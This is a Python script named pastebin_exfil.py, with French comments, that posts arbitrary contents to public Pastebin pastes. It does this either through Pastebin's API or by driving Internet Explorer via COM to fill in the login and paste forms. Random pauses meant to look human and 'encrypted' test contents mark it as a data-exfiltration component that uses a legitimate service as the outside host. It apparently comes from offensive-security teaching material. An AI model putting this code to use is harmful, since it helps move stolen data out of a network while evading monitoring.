# pastebin_exfil.py
from win32com import client
import os
import random
import requests
import time

# Configuration Pastebin (à remplacer par vos credentials)
username = 'tim'
password = 'seKret'
api_dev_key = 'cd3xxx001xxxx02'

def plain_paste(title, contents):
    """
    Fonction multiplateforme pour poster sur Pastebin via l'API
    """
    try:
        # Étape 1: Authentification pour obtenir la clé utilisateur
        login_url = 'https://pastebin.com/api/api_login.php'
        login_data = {
            'api_dev_key': api_dev_key,
            'api_user_name': username,
            'api_user_password': password,
        }
        r = requests.post(login_url, data=login_data)
        api_user_key = r.text
        
        # Étape 2: Création du paste
        paste_url = 'https://pastebin.com/api/api_post.php'
        paste_data = {
            'api_paste_name': title,
            'api_paste_code': contents.decode(),
            'api_dev_key': api_dev_key,
            'api_user_key': api_user_key,
            'api_option': 'paste',
            'api_paste_private': 0,  # 0 = public, 1 = unlisted, 2 = private
        }
        
        r = requests.post(paste_url, data=paste_data)
        print(f"Statut: {r.status_code}")
        print(f"Réponse: {r.text}")
        return r.text  # Retourne l'URL du paste créé
        
    except Exception as e:
        print(f"Erreur lors du paste API: {str(e)}")
        return None

# Fonctions pour la méthode Internet Explorer (Windows seulement)
def wait_for_browser(browser):
    """Attend que le navigateur ait terminé le chargement"""
    while browser.ReadyState != 4 and browser.ReadyState != 'complete':
        time.sleep(0.1)

def random_sleep():
    """Pause aléatoire pour simuler un comportement humain"""
    time.sleep(random.randint(5, 10))

def login(ie):
    """Remplit automatiquement le formulaire de login Pastebin"""
    full_doc = ie.Document.all
    for elem in full_doc:
        if elem.id == 'loginform-username':
            elem.setAttribute('value', username)
        elif elem.id == 'loginform-password':
            elem.setAttribute('value', password)
    
    random_sleep()
    
    # Soumet le formulaire s'il existe
    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()
    
    wait_for_browser(ie)

def submit(ie, title, contents):
    """Remplit et soumet le formulaire de création de paste"""
    full_doc = ie.Document.all
    for elem in full_doc:
        if elem.id == 'postform-name':
            elem.setAttribute('value', title)
        elif elem.id == 'postform-text':
            elem.setAttribute('value', contents)
    
    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()
    
    random_sleep()
    wait_for_browser(ie)

def ie_paste(title, contents):
    """
    Fonction Windows-specific utilisant Internet Explorer COM
    pour automatiser le processus de paste
    """
    try:
        # Lance Internet Explorer
        ie = client.Dispatch('InternetExplorer.Application')
        ie.Visible = 1  # 0 pour masquer le navigateur
        
        # Navigation vers la page de login
        ie.Navigate('https://pastebin.com/login')
        wait_for_browser(ie)
        
        # Login automatique
        login(ie)
        
        # Navigation vers la page principale
        ie.Navigate('https://pastebin.com/')
        wait_for_browser(ie)
        
        # Création du paste
        submit(ie, title, contents.decode())
        
        # Fermeture du navigateur après un délai
        time.sleep(5)
        ie.Quit()
        print("Paste effectué avec succès via Internet Explorer")
        
    except Exception as e:
        print(f"Erreur lors du paste IE: {str(e)}")
        if 'ie' in locals():
            ie.Quit()

if __name__ == '__main__':
    # Test avec la méthode API
    result = plain_paste('test_title', b'test_contents_encrypted')
    print(f"URL du paste: {result}")
    
    # Test avec Internet Explorer (Windows seulement)
    # ie_paste('test_title_ie', b'test_contents_encrypted_ie')